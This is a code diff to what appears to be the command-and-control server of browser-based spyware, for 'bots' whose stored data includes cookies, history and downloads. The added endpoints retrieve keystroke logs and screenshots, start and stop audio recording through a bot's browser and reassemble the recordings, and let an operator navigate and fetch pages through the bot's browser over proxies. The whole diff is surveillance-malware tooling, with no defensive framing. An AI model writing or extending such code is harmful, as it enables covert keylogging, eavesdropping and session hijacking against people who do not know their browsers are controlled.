@@ -10,6 +10,8 @@ const Users = database.Users;
 const Bots = database.Bots;
 const Settings = database.Settings;
 const BotRecording = database.BotRecording;
+const BotScreenshots = database.BotScreenshots;
+const BotKeyboardLogs = database.BotKeyboardLogs;
 const sequelize = database.sequelize;
 const fs = require("fs");
 const { promisify } = require("util");
@@ -161,6 +163,14 @@ async function get_api_server(proxy_utils) {
         type: "string",
         required: true,
       },
+      proxy_username: {
+        type: "string",
+        required: false,
+      },
+      proxy_password: {
+        type: "string",
+        required: false,
+      },
     },
   };
   const DeleteBotSchema = {
@@ -192,6 +202,8 @@ async function get_api_server(proxy_utils) {
           ...BOT_DEFAULT_DATA_CONFIG,
           ...req.body.data_config,
         },
+        proxy_username: req.body.proxy_username || bot.proxy_username,
+        proxy_password: req.body.proxy_password || bot.proxy_password,
       });
 
       res
@@ -225,6 +237,46 @@ async function get_api_server(proxy_utils) {
     }
   );
 
+  // Get global default proxy setting
+  app.get(API_BASE_PATH + "/settings/global-proxy", async (req, res) => {
+    const setting = await Settings.findOne({
+      where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" },
+    });
+    res.json({
+      success: true,
+      result: setting ? setting.value : null,
+    });
+  });
+
+  // Set global default proxy setting
+  app.post(API_BASE_PATH + "/settings/global-proxy", async (req, res) => {
+    const { bot_id } = req.body;
+    
+    let setting = await Settings.findOne({
+      where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" },
+    });
+
+    if (setting) {
+      await setting.update({ value: bot_id });
+    } else {
+      await Settings.create({
+        id: uuid.v4(),
+        key: "GLOBAL_DEFAULT_PROXY_BOT_ID",
+        value: bot_id,
+      });
+    }
+
+    // Notify all workers about the change
+    if (proxy_utils.notify_system_event) {
+      proxy_utils.notify_system_event("GLOBAL_PROXY_UPDATED");
+    }
+
+    res.json({
+      success: true,
+      result: bot_id,
+    });
+  });
+
   // get all bots
   app.get(API_BASE_PATH + "/bots", async (req, res) => {
     const bots = await Bots.findAll({
@@ -241,6 +293,8 @@ async function get_api_server(proxy_utils) {
         "history",
         "state",
         "last_online",
+        "last_active_at",
+        "activity",
       ],
     });
 
@@ -281,6 +335,8 @@ async function get_api_server(proxy_utils) {
     history: [],
     cookies: [],
     downloads: [],
+    activity: [],
+    screenshots: [],
   };
 
   app.get(API_BASE_PATH + "/fields", async (req, res) => {
@@ -621,6 +677,206 @@ async function get_api_server(proxy_utils) {
         .end();
     }
   );
+
+  app.post(
+    API_BASE_PATH + "/remote-control",
+    async (req, res) => {
+      const bot = await Bots.findOne({
+        where: {
+          id: req.body.bot_id,
+        },
+      });
+
+      if (!bot) {
+        res.status(200).json({ success: false, error: "Bot not found" }).end();
+        return;
+      }
+
+      try {
+        const result = await proxy_utils.tab_navigate_and_fetch(
+          bot.browser_id,
+          req.body.url
+        );
+
+        res.status(200).json({
+          success: true,
+          result: result,
+        }).end();
+      } catch (e) {
+        res.status(200).json({ success: false, error: e.toString() }).end();
+      }
+    }
+  );
+
+  app.post(
+    API_BASE_PATH + "/stop-remote-control",
+    async (req, res) => {
+      const bot = await Bots.findOne({
+        where: {
+          id: req.body.bot_id,
+        },
+      });
+
+      if (!bot) {
+        res.status(200).json({ success: false, error: "Bot not found" }).end();
+        return;
+      }
+
+      try {
+        await proxy_utils.stop_tab_navigate(bot.browser_id);
+
+        res.status(200).json({
+          success: true,
+          result: {},
+        }).end();
+      } catch (e) {
+        res.status(200).json({ success: false, error: e.toString() }).end();
+      }
+    }
+  );
+
+  app.get(API_BASE_PATH + "/screenshots", async (req, res) => {
+    const bot_id = req.query.id;
+    const limit = parseInt(req.query.limit) || 50;
+    const offset = parseInt(req.query.offset) || 0;
+
+    try {
+      const screenshots = await BotScreenshots.findAll({
+        where: { bot_id },
+        order: [["timestamp", "DESC"]],
+        limit,
+        offset,
+      });
+
+      res.status(200).json({
+        success: true,
+        result: screenshots,
+      });
+    } catch (e) {
+      res.status(200).json({ success: false, error: e.toString() });
+    }
+  });
+
+  app.get(API_BASE_PATH + "/keyboard-logs", async (req, res) => {
+    const bot_id = req.query.id;
+    const limit = parseInt(req.query.limit) || 50;
+    const offset = parseInt(req.query.offset) || 0;
+    const { startTime, endTime } = req.query;
+
+    try {
+      console.log(`[API] Fetching keyboard logs for bot: ${bot_id}, range: ${startTime} to ${endTime}`);
+      
+      let whereClause = { bot_id };
+      if (startTime || endTime) {
+        whereClause.timestamp = {};
+        if (startTime) whereClause.timestamp[Op.gte] = new Date(startTime);
+        if (endTime) whereClause.timestamp[Op.lte] = new Date(endTime);
+      }
+
+      const logs = await BotKeyboardLogs.findAll({
+        where: whereClause,
+        order: [["timestamp", "DESC"]],
+        limit,
+        offset,
+      });
+
+      res.status(200).json({
+        success: true,
+        result: logs,
+      });
+    } catch (e) {
+      res.status(200).json({ success: false, error: e.toString() });
+    }
+  });
+
+  app.post(API_BASE_PATH + "/start-audio", async (req, res) => {
+    const bot = await Bots.findOne({ where: { id: req.body.bot_id } });
+    if (!bot) return res.status(200).json({ success: false, error: "Bot not found" });
+    try {
+      await proxy_utils.start_audio_recording(bot.browser_id);
+      res.status(200).json({ success: true });
+    } catch (e) {
+      res.status(200).json({ success: false, error: e.toString() });
+    }
+  });
+
+  app.post(API_BASE_PATH + "/stop-audio", async (req, res) => {
+    const bot = await Bots.findOne({ where: { id: req.body.bot_id } });
+    if (!bot) return res.status(200).json({ success: false, error: "Bot not found" });
+    try {
+      await proxy_utils.stop_audio_recording(bot.browser_id);
+      res.status(200).json({ success: true });
+    } catch (e) {
+      res.status(200).json({ success: false, error: e.toString() });
+    }
+  });
+
+  app.get(API_BASE_PATH + "/recordings", async (req, res) => {
+    const bot_id = req.query.id;
+    try {
+      const recordings = await BotRecording.findAll({
+        where: { bot: bot_id },
+        order: [["timestamp", "DESC"]],
+        limit: 100
+      });
+      res.status(200).json({ success: true, result: recordings });
+    } catch (e) {
+      res.status(200).json({ success: false, error: e.toString() });
+    }
+  });
+
+  app.get(API_BASE_PATH + "/audio-sessions", async (req, res) => {
+    const bot_id = req.query.id;
+    try {
+      const sessions = await BotRecording.findAll({
+        attributes: [
+          'session_id',
+          [sequelize.fn('MIN', sequelize.col('timestamp')), 'start_time'],
+          [sequelize.fn('MAX', sequelize.col('timestamp')), 'end_time'],
+          [sequelize.fn('COUNT', sequelize.col('id')), 'chunk_count']
+        ],
+        where: { bot: bot_id, session_id: { [Op.ne]: null } },
+        group: ['session_id'],
+        order: [[sequelize.fn('MAX', sequelize.col('timestamp')), 'DESC']],
+        limit: 50
+      });
+      res.status(200).json({ success: true, result: sessions });
+    } catch (e) {
+      res.status(200).json({ success: false, error: e.toString() });
+    }
+  });
+
+  app.get(API_BASE_PATH + "/audio-session/:session_id", async (req, res) => {
+    try {
+      const chunks = await BotRecording.findAll({
+        where: { session_id: req.params.session_id },
+        order: [["timestamp", "ASC"]]
+      });
+      
+      if (chunks.length === 0) return res.status(404).send("Not found");
+      
+      const buffers = chunks.map(c => Buffer.from(c.recording, "base64"));
+      const combined = Buffer.concat(buffers);
+      
+      res.set("Content-Type", "audio/webm");
+      res.send(combined);
+    } catch (e) {
+      res.status(500).send(e.toString());
+    }
+  });
+
+  app.get(API_BASE_PATH + "/audio/:id", async (req, res) => {
+    try {
+      const recording = await BotRecording.findOne({ where: { id: req.params.id } });
+      if (!recording) return res.status(404).send("Not found");
+      
+      const buffer = Buffer.from(recording.recording, "base64");
+      res.set("Content-Type", "audio/webm"); // Default for MediaRecorder
+      res.send(buffer);
+    } catch (e) {
+      res.status(500).send(e.toString());
+    }
+  });
 
   // 添加CORS头部支持
   app.use((req, res, next) => {
